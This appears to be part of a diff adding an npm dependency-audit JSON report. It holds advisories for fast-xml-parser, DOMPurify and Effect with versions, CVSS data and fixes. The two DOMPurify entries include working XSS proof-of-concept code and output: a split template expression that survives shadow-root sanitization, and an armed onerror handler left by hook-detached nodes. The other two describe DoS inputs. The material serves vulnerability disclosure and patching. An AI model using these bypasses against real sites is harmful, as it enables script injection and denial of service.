remaining input, O(n²) work, before it finally throws.\n\n**Fix**\n1. Throw immediately in `readStopNodeData()` when `readTagExp()` returns `undefined`\n2. Or break the loop on the first failed scan\n3. Or find the next `>` once and reuse/bound that result\n4. Add a test asserting near-linear scaling when payload size doubles\n\n### Proof of concept\n\nNot benchmarked — static-analysis finding, confidence 0.5.\n\nTo confirm: configure `stopNodes` matching a root element. Build input as `'<stop>' + '<a '.repeat(n)`. Time `parse()` until it throws `Unexpected end of <tag>`. Start around n=10,000 and double it — quadratic should show ~4x time per doubling, linear ~2x. Control: same input with a `>` present, or `stopNodes` unset.\n\n### Impact\n\nCPU-exhaustion DoS in Node.js services parsing untrusted XML with `stopNodes` enabled. A ~100KB payload is estimated at ~10⁹ character operations (roughly a second or more of blocked event loop) — analytical estimate, not a benchmark. No confidentiality/integrity impact. CVSS 3.1: `AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L` (3.7, Low).",
+      "reported_by": null,
+      "title": "fast-xml-parser: Quadratic CPU consumption scanning unterminated stop-node tags",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-126066"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "fast-xml-parser",
+      "vulnerable_versions": "<=5.11.2",
+      "github_advisory_id": "GHSA-474x-hrwr-fgx4",
+      "recommendation": "Upgrade to version 5.12.0 or later",
+      "patched_versions": ">=5.12.0",
+      "updated": "2026-11-10T21:09:45.000Z",
+      "cvss": {
+        "score": 3.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L"
+      },
+      "cwe": [
+        "CWE-407"
+      ],
+      "url": "https://github.com/advisories/GHSA-474x-hrwr-fgx4"
+    },
+    "1247849": {
+      "findings": [
+        {
+          "version": "3.4.16",
+          "paths": [
+            "apps\\api > @raulbellosom/atlas-web-builder@0.11.1 > dompurify@3.4.16",
+            "apps\\desktop > @excalidraw/excalidraw@0.18.1 > @excalidraw/mermaid-to-excalidraw@2.2.2 > mermaid@11.17.2 > dompurify@3.4.16",
+            "apps\\desktop > @raulbellosom/atlas-web-builder@0.11.1 > dompurify@3.4.16",
+            "apps\\desktop > @runly/website-blocks@link:../../packages/website-blocks > @raulbellosom/atlas-web-builder@0.11.1 > dompurify@3.4.16",
+            "apps\\desktop > jspdf@4.2.1 > dompurify@3.4.16",
+            "packages\\website-blocks > @raulbellosom/atlas-web-builder@0.11.1 > dompurify@3.4.16"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/cure53/DOMPurify/security/advisories/GHSA-cg2g-xh64-v4q7\n- https://github.com/cure53/DOMPurify/pull/1672\n- https://github.com/cure53/DOMPurify/commit/a77a3e78b59f72fa4d1c83f22e121ad9cc7d3575\n- https://github.com/cure53/DOMPurify/releases/tag/3.4.17\n- https://github.com/advisories/GHSA-cg2g-xh64-v4q7",
+      "created": "2026-10-22T16:25:31.000Z",
+      "id": 1247849,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nWhen DOMPurify is configured with `SAFE_FOR_TEMPLATES: true` together with a DOM-returning mode (`RETURN_DOM: true`, `RETURN_DOM_FRAGMENT: true`, or `IN_PLACE: true`), template expressions such as `{{...}}`, `${...}`, and `<%...%>` survive sanitization inside the text content of an attached shadow root. The post-walk safety net `_scrubTemplateExpressions` (`src/purify.ts:1717`) was extended to recurse into `<template>.content`, but it never recurses into attached shadow roots. An attacker who can supply a DOM node carrying a shadow root (the `IN_PLACE` and shadow-aware `RETURN_DOM` surfaces) can split an expression across text nodes separated by disallowed elements; after those elements are removed the fragments become adjacent and serialize into a complete expression that a downstream template engine will evaluate.\n\n## Root Cause\n\n`SAFE_FOR_TEMPLATES` neutralizes template expressions through two mechanisms: a per-text-node strip during the main walk (`_stripTemplateExpressions`, applied in `_sanitizeElements` at `src/purify.ts:2246`), and a final post-walk pass (`_scrubTemplateExpressions`, `src/purify.ts:1717`) that normalizes adjacent text nodes and re-strips expressions that only form after merging. The per-node strip cannot catch an expression that is split into individual fragments, because each fragment fails the delimiter regexes. The post-walk pass is the only mechanism that would catch the merged form, but it is structurally unable to reach shadow root content.\n\n```text\n_scrubTemplateExpressions (src/purify.ts:1717-1751):\n  - node.normalize() at line 1718 does not merge text nodes inside shadow roots (DOM spec).\n  - NodeIterator at lines 1723-1731 does not descend into shadow trees (DOM spec).\n  - Explicit recursion at lines 1743-1750 enters <template>.content only, via\n    querySelectorAll('template'); there is no equivalent recursion into attached\n    shadow roots.\nShadow roots are sanitized earlier by _sanitizeShadowDOM (src/purify.ts:2710), which\napplies the per-node strip but never performs the post-walk normalize-and-rescrub.\n```\n\nShadow root text nodes are therefore sanitized only per-node and never re-examined as a merged unit.\n\n## Impact\n\nAn attacker who controls DOM-node input containing an attached shadow root can inject template expressions that survive sanitization and are later evaluated by the application's template engine. In client-side contexts this yields cross-site scripting; in a server-side template context it can escalate to template injection. Exploitation requires non-default application configuration: the application must enable `SAFE_FOR_TEMPLATES` and a DOM-returning mode, pass a DOM node that already has an attached shadow root, and feed the sanitized shadow root content into a template evaluator. The shadow root does not have to be built programmatically with `attachShadow`: in engines that support declarative shadow DOM, attacker-supplied markup containing `<template shadowrootmode=\"open\">` parsed through `setHTMLUnsafe` or `Document.parseHTMLUnsafe` produces the same attached shadow root, so a plain HTML string reaches the gap once the application is configured this way. Demonstrated capability is injection of a complete, attacker-chosen expression into post-sanitization shadow root content; the resulting script execution and any confidentiality or integrity consequence depend on the downstream engine's evaluation context.\n\n## Proof of Concept\n\n```text\nPreconditions:\n  - DOMPurify built from the affected source (dist/purify.js or an ESM/CJS bundle).\n  - A browser (or DOM implementation) with shadow DOM support.\n  - Application constructs a DOM node with an attached shadow root before sanitizing,\n    and later evaluates the shadow root's text content as a template.\n```\n\nBuild a host element whose shadow root holds a template expression split across text nodes separated by disallowed elements, then sanitize in place with `SAFE_FOR_TEMPLATES`:\n\n```javascript\nconst host = document.createElement('div');\nconst root = host.attachShadow({ mode: 'open' });\n\n// Split \"${alert(document.domain)}\" so no single fragment matches a regex.\n// <object> is not in the default ALLOWED_TAGS and is removed during sanitization,\n// leaving the surrounding text-node siblings adjacent.\nroot.appendChild(document.createTextNode('$'));\nroot.appendChild(document.createElement('object'));\nroot.appendChild(document.createTextNode('{alert(document.domain)}'));\n\nDOMPurify.sanitize(host, { IN_PLACE: true, SAFE_FOR_TEMPLATES: true });\n\n// After the disallowed element is removed, the fragments are adjacent and survive.\nhost.shadowRoot.normalize();\nconsole.log(host.shadowRoot.textContent);\n```\n\n```text\n${alert(document.domain)}\n```\n\nA downstream template evaluator reading `shadowRoot.textContent` (for example `new Function('return `' + content + '`')()` or any `${...}`/`{{...}}` engine) then evaluates the fully formed expression.\n\n## Attack Chain\n\n1. **Exposure:** The application calls `DOMPurify.sanitize(node, cfg)` (`src/purify.ts:2854`) with `SAFE_FOR_TEMPLATES: true` and `IN_PLACE: true` (or a shadow-aware `RETURN_DOM`), passing a DOM node that already carries an attached shadow root.\n2. **Control:** The attacker controls the shadow root's text nodes and the disallowed separator elements between them; each fragment (`$`, `{alert(document.domain)}`) is a valid, individually benign text node.\n3. **Path:** `_sanitizeAttachedShadowRoots` (`src/purify.ts:2977`) feeds the shadow root into `_sanitizeShadowDOM` (`src/purify.ts:2710`), which strips expressions per text node (`src/purify.ts:2246`) and removes the disallowed separator elements, leaving the fragments adjacent.\n4. **Guard:** The post-walk safety net `_scrubTemplateExpressions` (`src/purify.ts:3131-3132`) is the only pass that would catch the merged expression, but it never recurses into shadow roots (`src/purify.ts:1717-1751` recurses into `<template>.content` only).\n5. **Primitive:** The adjacent fragments serialize as a single concatenated string on `shadowRoot.textContent` / `shadowRoot.innerHTML`, reconstituting the complete expression.\n6. **Result:** A downstream template engine evaluates the attacker-chosen expression, achieving script execution (or template injection) in the engine's context.\n\n## Bypass Evidence\n\nThe relevant protection is `SAFE_FOR_TEMPLATES`, specifically the post-walk pass that defends against expressions that only form after adjacent text nodes merge. That defense was previously extended to `<template>.content` under CVE-2026-65900 (GHSA-gvmj-g25r-r7wr) by adding `querySelectorAll('template')` recursion at `src/purify.ts:1743-1750`. The strongest challenge is whether any code path performs the equivalent merge-and-rescrub inside shadow roots. Enumerating every call site of `_scrubTemplateExpressions` (`src/purify.ts:1717`, `1747`, `3132`, `3141`) shows none receive a shadow root, and `_sanitizeShadowDOM` (`src/purify.ts:2710`) never calls `_scrubTemplateExpressions` or `normalize()`. The per-node strip cannot compensate: `MUSTACHE_EXPR` (`src/regexp.ts:3`) requires `{{` or `}}`, `TMPLIT_EXPR` (`src/regexp.ts:5`) requires `${`, and `ERB_EXPR` (`src/regexp.ts:4`) requires `<%` or `%>`, none of which appear in a single-character fragment. The CVE-2026-65900 regression tests exercise `<template>.content` only; no test covers shadow root content under `SAFE_FOR_TEMPLATES`. The gap is therefore an unfixed case on a distinct remediation boundary (shadow roots) rather than a bypass of the delivered template-content fix.\n\n## Affected Versions\n\n- **Ecosystem:** `npm`\n- **Package:** `dompurify`\n- **Confirmed affected range:** `>= 3.4.4, <= 3.4.16`\n- **Latest release checked:** `3.4.16` ([npm registry](https://www.npmjs.com/package/dompurify/v/3.4.16))\n- **Fix status:** not fixed\n\nThe lower bound 3.4.4 is the release that introduced both the attached-shadow-root sanitization pass and the `_scrubTemplateExpressions` safety net; releases 3.4.4 through 3.4.7 carry the safety net with no content-container recursion, and 3.4.8 onward add `<template>.content` recursion but still omit shadow root recursion. No published release and no current development revision contains a shadow-root fix.\n\n## Suggested Fix\n\nEnforce the same post-walk normalize-and-rescrub invariant on attached shadow roots that already applies to `<template>.content`. After `_sanitizeShadowDOM` finishes walking a shadow root, run `_scrubTemplateExpressions` over that shadow root so adjacent text nodes created by element removal are merged and re-stripped; alternatively, have `_scrubTemplateExpressions` discover and recurse into attached shadow roots as it does for template content. The fix must cover nested shadow roots and shadow roots inside `<template>.content`, and it must handle all three expression dialects, since any disallowed element can serve as the separator that produces adjacent fragments.\n\n---\n\nReported by zx (GitHub: @manus-pi).",
+      "reported_by": null,
+      "title": "DOMPurify SAFE_FOR_TEMPLATES bypass: split template expressions survive in attached shadow root content on DOM output modes",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "low",
+      "module_name": "dompurify",
+      "vulnerable_versions": ">=3.4.4 <=3.4.16",
+      "github_advisory_id": "GHSA-cg2g-xh64-v4q7",
+      "recommendation": "Upgrade to version 3.4.17 or later",
+      "patched_versions": ">=3.4.17",
+      "updated": "2026-11-19T00:03:19.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-79"
+      ],
+      "url": "https://github.com/advisories/GHSA-cg2g-xh64-v4q7"
+    },
+    "1247850": {
+      "findings": [
+        {
+          "version": "3.4.16",
+          "paths": [
+            "apps\\api > @raulbellosom/atlas-web-builder@0.11.1 > dompurify@3.4.16",
+            "apps\\desktop > @excalidraw/excalidraw@0.18.1 > @excalidraw/mermaid-to-excalidraw@2.2.2 > mermaid@11.17.2 > dompurify@3.4.16",
+            "apps\\desktop > @raulbellosom/atlas-web-builder@0.11.1 > dompurify@3.4.16",
+            "apps\\desktop > @runly/website-blocks@link:../../packages/website-blocks > @raulbellosom/atlas-web-builder@0.11.1 > dompurify@3.4.16",
+            "apps\\desktop > jspdf@4.2.1 > dompurify@3.4.16",
+            "packages\\website-blocks > @raulbellosom/atlas-web-builder@0.11.1 > dompurify@3.4.16"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/cure53/DOMPurify/security/advisories/GHSA-mrv2-3pqr-j5jr\n- https://github.com/cure53/DOMPurify/pull/1672\n- https://github.com/cure53/DOMPurify/commit/a77a3e78b59f72fa4d1c83f22e121ad9cc7d3575\n- https://github.com/cure53/DOMPurify/releases/tag/3.4.17\n- https://github.com/advisories/GHSA-mrv2-3pqr-j5jr",
+      "created": "2026-10-22T16:24:52.000Z",
+      "id": 1247850,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nThe 3.4.16 fix for GHSA-p98j-92pf-mc4p only covers a hook that removes the node it was called for. If an `IN_PLACE` hook removes a different node, like the current node's parent or a sibling that has not been visited yet, that subtree is never walked or neutralized. Event handlers in it stay on the elements, and an `<img onerror>` that was already loading fires after `sanitize()` returns.\n\nThe README says: \"Nodes that a hook detaches from the tree ... are treated as removed. In IN_PLACE mode their subtree is neutralized inline, so an `<img onload>` that was already loading when you built the live tree cannot fire after `sanitize()` returns.\" That does not hold when the detached node is not the hook's own node.\n\n### Tested versions\n\n- 3.4.16 (latest) and main at 18f8f0e\n- also 3.4.15, 3.4.12 and 2.5.8\n\njsdom for the matrix below, and Chromium (Playwright) for the event actually firing.\n\n### Details\n\n`src/purify.ts` line 2134 (`dist/purify.cjs.js` line 2009 in 3.4.16), `_handleHookDetachedNode()`:\n\n```js\nif (currentNode === root || getParentNode(currentNode) !== null) {\n  return false;\n}\nif (IN_PLACE) {\n  _neutralizeSubtree(currentNode);\n}\n```\n\nIt only checks whether `currentNode` lost its parent. When a hook removes `currentNode.parentNode` (or any ancestor), `currentNode` still has a parent, so nothing happens. The rest of the removed subtree is no longer reachable by the walker, and it is not in `DOMPurify.removed`, so the post walk pass does not see it either. The same happens when a hook removes a later sibling. This applies to all five element and attribute hooks.\n\n### PoC (jsdom)\n\n```js\nconst { JSDOM } = require('jsdom')\nconst createDOMPurify = require('dompurify')\nconst win = new JSDOM('<!doctype html><body></body>').window\nconst doc = win.document\n\nfor (const mode of ['self', 'parent', 'nextSibling']) {\n  const DOMPurify = createDOMPurify(win)\n  doc.body.innerHTML = '<div id=root><figure><img class=bad src=a.png>' +\n    '<img id=evil src=x onerror=alert(1)></figure><p>ok</p></div>'\n  const root = doc.getElementById('root')\n  const evil = doc.getElementById('evil')\n\n  // app hook: drop a bad image (self), its wrapper (parent), or the next element (nextSibling)\n  DOMPurify.addHook('afterSanitizeAttributes', (node) => {\n    if (node.getAttribute && node.getAttribute('class') === 'bad') {\n      if (mode === 'self') node.remove()\n      if (mode === 'parent') node.parentNode.remove()\n      if (mode === 'nextSibling') node.nextElementSibling.remove()\n    }\n  })\n\n  DOMPurify.sanitize(root, { IN_PLACE: true })\n  console.log(DOMPurify.version, mode.padEnd(11), 'onerror =', JSON.stringify(evil.getAttribute('onerror')))\n}\n```\n\nOutput on 3.4.16:\n\n```\n3.4.16 self        onerror = null\n3.4.16 parent      onerror = \"alert(1)\"\n3.4.16 nextSibling onerror = \"alert(1)\"\n```\n\nIn `self` mode the walker still reaches the second image and strips `onerror`. In the other two modes the second image is detached with its handler still set. The same result is achieved with each of `beforeSanitizeElements`, `uponSanitizeElement`, `afterSanitizeElements`, `beforeSanitizeAttributes` and `afterSanitizeAttributes`.\n\n### PoC (browser)\n\nThe same thing in a real page, served from 127.0.0.1 and opened in Chromium:\n\n```html\n<!doctype html><meta charset=utf-8>\n<script src=\"purify.min.js\"></script>\n<body><pre id=log></pre>\n<script>\nwindow.fired = [];\nfunction run(mode) {\n  const D = DOMPurify(window);\n  D.addHook('afterSanitizeAttributes', n => {\n    if (n.getAttribute && n.getAttribute('class') === 'bad') {\n      if (mode === 'parent') n.parentNode.remove();\n      if (mode === 'self') n.remove();\n    }\n  });\n  const root = document.createElement('div');\n  document.body.appendChild(root);\n  root.innerHTML = '<figure><img class=bad src=data:,><img src=x onerror=\"fired.push(\\'' + mode + '\\')\"></figure><p>ok</p>';\n  D.sanitize(root, { IN_PLACE: true });\n  return root.outerHTML;\n}\nconst a = run('self'), b = run('parent');\nsetTimeout(() => {\n  document.getElementById('log').textContent =\n    'version=' + DOMPurify.version + '\\nself out=' + a + '\\nparent out=' + b + '\\nfired=' + JSON.stringify(fired);\n}, 1500);\n</script>\n```\n\nResult on 3.4.16:\n\n```\nversion=3.4.16\nself out=<div><figure><img src=\"x\"></figure><p>ok</p></div>\nparent out=<div><p>ok</p></div>\nfired=[\"parent\"]\n```\n\nThe returned tree is clean in both cases, but the handler on the detached image runs in the page for `parent`.\n\n### Impact\n\nAn app that uses `IN_PLACE` with a hook that removes a wrapper or a nearby element (for example \"drop the whole `<figure>` if its image is not allowed\") gets DOM XSS from attacker markup after `sanitize()` returns. It needs that kind of hook, so it falls under \"input plus an application choice\" in SECURITY.md, but it breaks the guarantee the README gives for hook detached nodes and is the same pattern as GHSA-55q2-fjhq-7xh7 and GHSA-p98j-92pf-mc4p.\n\n### Suggested fix\n\nInstead of only checking `currentNode`, check after each hook call whether anything outside the current node was detached. Two simple options:\n\n- before calling a hook in `IN_PLACE` mode, remember the next node the walker will visit and the current node's ancestors; after the hook, neutralize any of them that are no longer attached under `root`\n- or, after the walk, neutralize every element that was in the original tree but is no longer connected to `root` (for example by collecting the elements before the walk)",
+      "reported_by": null,
+      "title": "DOMPurify IN_PLACE: hook that removes a parent or sibling leaves the detached subtree's event handlers armed (incomplete fix for GHSA-p98j-92pf-mc4p)",
+      "metadata": null,
+      "cves": [],
+      "access": "public",
+      "severity": "low",
+      "module_name": "dompurify",
+      "vulnerable_versions": "<=3.4.16",
+      "github_advisory_id": "GHSA-mrv2-3pqr-j5jr",
+      "recommendation": "Upgrade to version 3.4.17 or later",
+      "patched_versions": ">=3.4.17",
+      "updated": "2026-11-19T00:06:58.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-79",
+        "CWE-693"
+      ],
+      "url": "https://github.com/advisories/GHSA-mrv2-3pqr-j5jr"
+    },
+    "1248071": {
+      "findings": [
+        {
+          "version": "3.20.0",
+          "paths": [
+            ". > @prisma/client@7.8.0 > prisma@7.8.0 > @prisma/config@7.8.0 > effect@3.20.0",
+            ". > prisma@7.8.0 > @prisma/config@7.8.0 > effect@3.20.0",
+            "apps\\api > @prisma/client@7.8.0 > prisma@7.8.0 > @prisma/config@7.8.0 > effect@3.20.0",
+            "apps\\worker > @prisma/client@7.8.0 > prisma@7.8.0 > @prisma/config@7.8.0 > effect@3.20.0"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/Effect-TS/effect/security/advisories/GHSA-7589-6fvf-x4pw\n- https://nvd.nist.gov/vuln/detail/CVE-2026-121707\n- https://github.com/Effect-TS/effect/pull/6761\n- https://github.com/Effect-TS/effect/commit/3cc3c6e1a64cbdc360e9d28e44f3ec3ce0ece6e3\n- https://github.com/Effect-TS/effect/releases/tag/effect@3.22.1\n- https://github.com/advisories/GHSA-7589-6fvf-x4pw",
+      "created": "2026-11-19T20:51:01.000Z",
+      "id": 1248071,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\n`Schema.TemplateLiteral` compiles each `Schema.String` span to the lazy wildcard `[\\s\\S]*?` and decodes input by running the resulting regular expression against it. When a template has two or more `Schema.String` spans, for example:\n\n```ts\nSchema.TemplateLiteral(Schema.String, \":\", Schema.String, \":\", Schema.String, \"X\")\n```\n\nthe regex contains several ambiguous wildcards. A non-matching input makes the backtracking engine try combinations across all of them, so matching time grows cubically with input length. A 5,000-character string of `:` characters blocks the event loop for about 15 seconds.\n\nApplications that decode untrusted input with such a schema are affected. That includes `Schema.decodeUnknown`, `Schema.decodeUnknownSync` and `Schema.is`, and anything built on them, such as `HttpApi` request payloads and `@effect/rpc` payloads.\n\n### Patches\n\nFixed in `effect@3.22.1` (#6761). Template literals whose spans are all `Schema.String` are now matched with a linear left-to-right scan instead of a regular expression.\n\n### Workarounds\n\nIf you can't upgrade, check the input length before the template literal runs. Adding `Schema.maxLength` with `.pipe` doesn't help, because the filter runs after the regex. Put the length check on the input side instead:\n\n```ts\nSchema.compose(Schema.String.pipe(Schema.maxLength(256)), MyTemplateLiteral)\n```\n\nRejecting oversized request bodies before they reach the schema also works.",
+      "reported_by": null,
+      "title": "Effect: ReDoS in Schema.TemplateLiteral compiled regex",
+      "metadata": null,
+      "cves": [
+        "CVE-2026-121707"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "effect",
+      "vulnerable_versions": "<=3.22.0",
+      "github_advisory_id": "GHSA-7589-6fvf-x4pw",
+      "recommendation": "Upgrade to version 3.22.1 or later",
+      "patched_versions": ">=3.22.1",
+      "updated": "2026-11-19T20:51:02.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-1333"
+      ],
+      "url": "https://github.com/advisories/GHSA-7589-6fvf-x4pw"
+    }
+  },
+  "muted": [],
+  "metadata": {
+    "vulnerabilities": {
+      "info": 0,
+      "low": 7,
+      "moderate": 12,
+      "high": 14,
+      "critical": 1
+    },
+    "dependencies": 1423,
+    "devDependencies": 0,
+    "optionalDependencies": 0,
+    "totalDependencies": 1423
+  }
+}
